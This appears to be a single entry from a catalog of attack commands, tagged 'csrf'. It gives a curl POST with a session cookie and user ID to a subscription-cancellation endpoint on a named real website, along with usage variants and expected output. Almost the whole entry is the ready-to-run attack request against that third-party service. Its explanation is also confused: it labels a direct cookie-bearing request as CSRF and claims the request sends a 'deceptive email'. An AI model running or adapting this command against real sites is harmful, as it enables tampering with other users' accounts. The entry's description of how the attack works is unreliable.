---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  curl -X POST -b "session_id=abc123"
  https://atavist.com/cms/ajax/cancel_subscription.php -d "user_id=123"
tags:
  - csrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.138Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-sub-cancel

## Command

```bash
curl -X POST -b "session_id=abc123" https://atavist.com/cms/ajax/cancel_subscription.php -d "user_id=123"
```

## Description

Simulates subscription cancellation via CSRF, sending a deceptive email without actually ending the service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-b "session_id=abc123"` | Session cookie | Yes |
| `-d "user_id=123"` | User ID parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -b "session_id=abc123" https://atavist.com/cms/ajax/cancel_subscription.php -d "user_id=123"
```

### Advanced Usage

```bash
curl -X POST -b "session_id=abc123" -d "user_id=123&reason=unhappy" https://atavist.com/cms/ajax/cancel_subscription.php
```

## Expected Output

200 OK with email trigger confirmation, but subscription remains active.

## Related

- [[commands/curl-csrf-credit-delete]]
- [[procedures/Demonstrate-CSRF-Exploitation]]
